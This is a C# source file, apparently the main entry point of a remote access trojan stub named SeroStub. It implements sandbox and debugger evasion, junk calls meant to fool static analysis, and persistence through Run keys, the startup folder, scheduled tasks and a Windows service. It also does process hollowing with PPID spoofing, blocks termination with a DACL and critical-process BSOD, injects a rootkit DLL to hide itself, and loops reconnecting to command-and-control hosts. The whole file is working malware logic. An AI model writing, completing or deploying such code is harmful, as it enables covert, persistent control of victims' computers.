using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeroStub;

partial class Program
{
    private static Mutex? _mutex;

    public static void ReleaseMutex()
    {
        try { _mutex?.ReleaseMutex(); } catch { }
        _mutex?.Dispose();
        _mutex = null;
    }

    private static void ProtectionExit(string check)
    {
        StubLog.Info($"{check} triggered, exiting.");
    }

    [System.Diagnostics.Conditional("DEBUG")]
    private static void Breadcrumb(string msg)
    {
        StubLog.Info($"[Breadcrumb] {msg}");
    }

    private static bool IsAdmin()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(identity)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    internal static void ReacquireMutex()
    {
        if (!Config.UseMutex) return;

        try
        {
            _mutex = new Mutex(true, Config.MutexName, out bool created);
            if (!created) _mutex.WaitOne(3000);
        }
        catch (AbandonedMutexException ex)
        {
            _mutex = ex.Mutex ?? _mutex;
        }
        catch { }
    }

    [LibraryImport("kernel32.dll")]
    private static partial uint SetErrorMode(uint uMode);

    [LibraryImport("kernel32.dll")]
    private static partial uint GetACP();
    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial int GetLocaleInfoW(uint Locale, uint LCType, nint lpLCData, int cchData);
    [LibraryImport("kernel32.dll")]
    private static partial nint GetStdHandle(int nStdHandle);
    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial uint GetModuleFileNameW(nint hModule, nint lpFilename, uint nSize);
    [LibraryImport("user32.dll")]
    private static partial int GetSystemMetrics(int nIndex);
    [LibraryImport("kernel32.dll")]
    private static partial ulong GetTickCount64();

    // Junk initialization — looks like normal app startup to static analysis
    private static void _InitRuntime()
    {
        _ = GetACP();
        _ = GetLocaleInfoW(0x0409, 0x59, nint.Zero, 0);
        _ = GetStdHandle(-10);
        _ = GetSystemMetrics(0);
        _ = GetSystemMetrics(1);
        _ = GetTickCount64();
        unsafe { var buf = stackalloc char[260]; GetModuleFileNameW(nint.Zero, (nint)buf, 260); }
    }

    // Original interactive desktop handle — captured before hollowing so the RDP
    // capture thread can call SetThreadDesktop() and access the user's display.
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern nint GetThreadDesktop(uint dwThreadId);
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();
    internal static nint OriginalDesktop;

    [STAThread]
    static async Task Main()
    {
        // Capture original desktop FIRST — before process hollowing changes the thread context
        OriginalDesktop = GetThreadDesktop(GetCurrentThreadId());

        // Suppress crash/WER dialogs — prevents "buffer overrun" popup when DACL blocks external kill
        SetErrorMode(0x0001 | 0x0002 | 0x8000);
        _InitRuntime();

        // Guardian check: if launched as guardian, monitor parent and exit
        if (Protection.RunAsGuardianIfNeeded()) return;

        // If a fresh stop flag exists we were relaunched by a guardian right after
        // uninstall — exit so the mutex does not get re-acquired.
        if (Protection.IsRecentStopFlag()) { Breadcrumb("EXIT: recent stop flag"); return; }

        // Single instance (if mutex is enabled)
        if (Config.UseMutex)
        {
            bool created = false;
            try
            {
                _mutex = new Mutex(true, Config.MutexName, out created);
            }
            catch (AbandonedMutexException ex)
            {
                // Previous holder was killed without releasing (kill/crash/uninstall).
                // Windows transfers ownership to us — grab the handle and continue.
                _mutex = ex.Mutex ?? _mutex;
                created = true;
            }
            if (!created) { Breadcrumb("EXIT: mutex already held"); return; }
        }

        // We hold the mutex (or UseMutex is off) — clear any stale stop flag
        // so a legitimate relaunch after a crash is not blocked.
        Protection.ClearStopFlag();

        // Apply DACL immediately — before any delay or check — so the process is
        // protected from TerminateProcess() during the entire startup window.
        // Without this, a re-launched process can be killed in the 2-4s gap
        // between relaunch and the watchdog setup at the end of Main().
        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
            Protection.ProtectProcessDacl();

        bool admin = IsAdmin();
        Breadcrumb($"START admin={admin} path={Environment.ProcessPath}");

        // Anti-Protection checks FIRST (before any process manipulation)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            // Anti-sandbox: short sleep to bypass fast-forward detection
            await Task.Delay(1500);

            if (Config.AntiDebug && Protection.IsDebuggerDetected()) { ProtectionExit("AntiDebug"); return; }
            if (Config.AntiVM && Protection.IsVirtualMachine()) { ProtectionExit("AntiVM"); return; }
            if (Config.AntiDetect && Protection.IsAnalysisEnvironment()) { ProtectionExit("AntiDetect"); return; }
            if (Config.AntiSandbox && Protection.IsSandbox()) { ProtectionExit("AntiSandbox"); return; }
        }

        // Persistence BEFORE hollowing (so Environment.ProcessPath = original exe)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            bool hasPersist = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist)
            {
                // Release mutex BEFORE EnsureInstalled so the relaunched copy can acquire it.
                // EnsureInstalled starts the new process inline; if we release after, the new
                // process hits !created and exits immediately (race condition on relaunch).
                if (Config.UseMutex) ReleaseMutex();

                var installPath = Persistence.EnsureInstalled(Config.PersistName, admin, allowMultiInstance: !Config.UseMutex);
                if (installPath != null)
                {
                    // New process already started by EnsureInstalled — just exit.
                    Breadcrumb($"EXIT: relaunching from {installPath}");
                    return;
                }

                // Already at install path or admin mode: re-acquire the mutex we just released.
                if (Config.UseMutex) ReacquireMutex();
                // installPath == null means we're already running from the install dir (or admin mode)
                if (Config.PersistRegistry) Persistence.InstallRegistry(Config.PersistName);
                if (Config.PersistStartup) Persistence.InstallStartup(Config.PersistName);
                if (Config.PersistTask) Persistence.InstallScheduledTask(Config.PersistName);

                // Elevated persistence — much harder to remove without admin tools
                if (admin)
                {
                    // HKLM Run key: survives user-level cleanup, applies to all users
                    Persistence.InstallRegistryHKLM(Config.PersistName);

                    // Windows service: starts before login, auto-restarts on crash
                    // Only create once (service creation is slow)
                    if (!Persistence.IsServiceInstalled(Config.PersistName))
                        Persistence.InstallService(Config.PersistName);
                }
            }
        }

        // Store real exe path before hollowing so the guardian can find it
        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
        {
            var realPath = Environment.ProcessPath;
            if (!string.IsNullOrEmpty(realPath))
                Environment.SetEnvironmentVariable("SERO_EXE", realPath);
        }

        // Process hollowing: if enabled and we're NOT the hollowed instance, hollow and exit
        // Skip PPID spoofing when admin to preserve elevation token
        if (Config.EnableHollowing && !ProcessHollowing.IsHollowedInstance())
        {
            StubLog.Info($"Hollowing self into {Config.HollowTarget}...");

            // Release mutex BEFORE hollowing so the child process can acquire it
            ReleaseMutex();

            int pid = ProcessHollowing.HollowSelf(Config.HollowTarget, skipPpidSpoof: admin);
            if (pid > 0)
            {
                Breadcrumb($"Hollowed OK PID={pid}, exiting parent.");
                return;
            }

            // Hollowing failed — reacquire mutex and continue as normal
            Breadcrumb("Hollowing failed, continuing.");
            ReacquireMutex();
            StubLog.Error("Hollowing failed, continuing as normal process.");
        }


        // Hide thread from debugger (only if AntiDebug is enabled)
        if (Config.AntiDebug)
            Protection.HideFromDebugger();

        // Anti-Kill: mark as critical process (BSOD if killed, requires admin)
        if (Config.AntiKill && admin)
            Protection.SetCriticalProcess();

        // Watchdog: DACL + guardian process + startup surveillance
        // Works with or without hollowing — guardian finds exe via installed path or original ProcessPath
        if (Config.EnableWatchdog)
        {
            Protection.ProtectProcessDacl();
            Protection.StartAntiKillWatchdog();
            bool hasPersist2 = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist2)
            {
                Persistence.StartWatchdog(Config.PersistName);
            }
        }

        // Rootkit: inject hook DLL into all processes to hide our files/process/port/registry.
        // Requires admin (or SYSTEM from UAC bypass) — CreateRemoteThread into system processes needs it.
        if (Config.EnableRootkit && admin)
            Rootkit.Start();

        // Auto-reconnect loop — cycles through all hosts on each failure
        int hostIdx = 0;
        while (true)
        {
            var host = Config.Hosts[hostIdx % Config.Hosts.Length];
            hostIdx++;
            try
            {
                Breadcrumb($"CONNECTING to {host}:{Config.Port}");
                StubLog.Info($"Connecting to {host}:{Config.Port}...");
                using var client = new TlsClient(host, Config.Port);
                await client.RunAsync(CancellationToken.None);

                // Server sent Disconnect or Uninstall — stop reconnecting
                if (!client.ShouldReconnect)
                {
                    StubLog.Info("Server requested stop, exiting.");
                    return;
                }

                StubLog.Info("Connection lost, will reconnect...");
            }
            catch (Exception ex)
            {
                StubLog.Error($"Connection error ({host}): {ex.GetType().Name}: {ex.Message}");
            }

            // Wait before reconnecting
            await Task.Delay(Config.ReconnectDelayMs);
        }
    }
}
